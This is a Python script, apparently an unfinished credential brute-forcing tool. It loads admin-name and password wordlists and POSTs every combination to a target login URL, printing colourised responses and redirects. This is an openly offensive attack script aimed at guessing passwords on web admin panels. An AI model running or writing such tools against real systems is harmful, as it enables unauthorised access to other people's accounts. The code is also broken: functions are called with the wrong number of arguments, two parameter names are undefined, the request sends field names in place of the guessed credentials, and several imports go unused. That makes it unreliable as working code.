import socks
import requests
import socket
import os
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
admin_el = []
psd = []
# initialize colorama
init()

# ansi color vars
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
def exploit(inputs,url):
    if len(inputs) == 2:
        name1, name2 = inputs
        print(f'The input names are: {name1} and {name2}')
        input_name1 = str(name1)
        input_name2 = str(name2)
        brute(input_name1,input_name2)
    else:
        print('The number of input elements is not equal to 2')
def brute(username_input_name,password_input_name,admin_list_file,password_list_file,url):
    with open(admin_list_file,'r') as admin_list_file :
        for line in admin_list_file:
            admin_el.append(line.strip())
    with open(password_list_file, 'r') as f:
        psd = [line.strip() for line in f]
        for admin in admin_el:
            for password in psd:
                print(f"{RESET}{CYAN}Trying: {RESET}{YELLOW}{admin}{RESET}{CYAN} with password {RESET}{YELLOW}{password}{RESET}")
                params = {
                uid_param : username_input_name,
                password_param : password_input_name
                }
                try:
                     response = requests.post(url, params=params, allow_redirects=True)
                     if response.status_code == 200:
                          print(f'\n({RED}!{RESET}) {CYAN} REQUEST-POSTED{RESET}\n{BOLD}({RESET}{RED}*{RESET}{BOLD})The fetched response is: {RESET}{YELLOW}\n')
                          print(response.content.decode('utf-8'))
                     elif response.status_code in [301, 302]:
                         print('Redirection detected!\n=== The fetched response is: \n')
                         print(response.headers['Location'])
                     else:
                          print('Error while sending request!\n=== Details of Failure ===\n')
                          print(response.status_code)
                except requests.exceptions.RequestException:
                    print('Failed to make request')
               # print(requests.exception.RequestException)
